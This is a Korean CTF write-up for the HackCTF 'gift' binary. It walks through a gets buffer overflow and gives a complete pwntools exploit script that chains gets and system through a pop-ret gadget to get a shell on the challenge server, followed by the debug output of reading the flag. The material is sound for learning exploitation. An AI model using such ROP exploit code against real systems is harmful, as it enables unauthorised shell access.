# Gift

```c
kimdong@ubuntu  ~/Wargame/200~250  file gift
gift: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=ad5f9a7976dcc093b6aa0cddddcfa4e3a2ad149e, not stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec gift
[*] '/home/kimdong/Wargame/200~250/gift'
   Arch:     i386-32-little
   RELRO:    No RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
```
이번 바이너리파일은 32-bit로 NX-bit가 설정되어있다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./gift
Hey guyssssssssss here you are: 0x8049940 0xf7daed10
aaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaa
```
실행시켜보면, 문자열이 출력되고, 사용자의 입력값을 받는다.<br>

받은 입력값을 출력시켜주고, 다시 사용자의 입력값을 받고 종료된다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-84h]

  alarm(0x3Cu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  printf("Hey guyssssssssss here you are: %p %p\n", &binsh, &system);
  fgets(&s, 128, stdin);
  printf(&s);
  gets(&s);
  return 0;
}
```
main문은 fgets로 사용자의 입력값을 받고, printf로 출력해준뒤에, 다시 gets로 사용자의 입력값을 받는 형식이다.<br>

그리고 처음에 띄워준 주소는 `system`함수와 `/bin/sh`의 주소이다.<br>

s의 크기는 132Byte이다.<br>

fgets로 받는 크기는 128Byte로 이 함수에서는 `BOF`취약점이 불가해보인다.<br>

하지만, gets에서는 검증을 하지 않으므로, `BOF`취약점을 이용가능할 것으로 보인다.<br>

위에 주어진 binsh_addr은 해당 주소에 `/bin/sh`문자열을 입력하라는 주소지로 보인다.<br>

따라서 `pop ret gadget`을 통해 gets 함수를 이용해 binsh_addr에 `/bin/sh`문자열을 입력하고, ret주소를 `binsh_addr`로 덮어씌워주면 해결가능할것으로 보인다.<br>
```c
✘ kimdong@ubuntu  ~/Wargame/200~250  ./rp-lin-x86 -f gift -i 1 -r 1 |grep "pop"
0x0804866b: pop ebp ; ret  ;  (1 found)
```
`pr gadget`은 `0x0804866b`을 사용하도록 한다.<br>

---

```c
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3018)
context.log_level = "debug"

e = ELF("./gift")
pr = 0x0804866b

gets_addr = e.plt["gets"]

p.recvuntil("Hey guyssssssssss here you are: ")
binsh_addr = int(p.recv(10),16)
system_addr = int(p.recv(10),16)

payload = "A"*3
p.sendline(payload)

payload2 = "A"*136
payload2 += p32(gets_addr)
payload2 += p32(pr)
payload2 += p32(binsh_addr)

payload2 += p32(system_addr)
payload2 += "A"*4
payload2 += p32(binsh_addr)

p.sendline(payload2)
p.sendline("/bin/sh\x00")
p.interactive()

```

```c
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x3b bytes:
    00000000  48 61 63 6b  43 54 46 7b  ed 94 8c eb  9e 98 ea b7  │Hack│CTF{│····│····│
    00000010  b8 5f ec 9e  98 5f eb b0  9b ec 95 98  ec a7 80 3f  │·_··│·_··│····│···?│
    00000020  5f ec 9d b4  ea b2 8c 5f  eb 82 b4 5f  ec 84 a0 eb  │_···│···_│···_│····│
    00000030  ac bc ec 9d  b4 ec 95 bc  21 7d 0a                  │····│····│!}·│
    0000003b
HackCTF{}
```
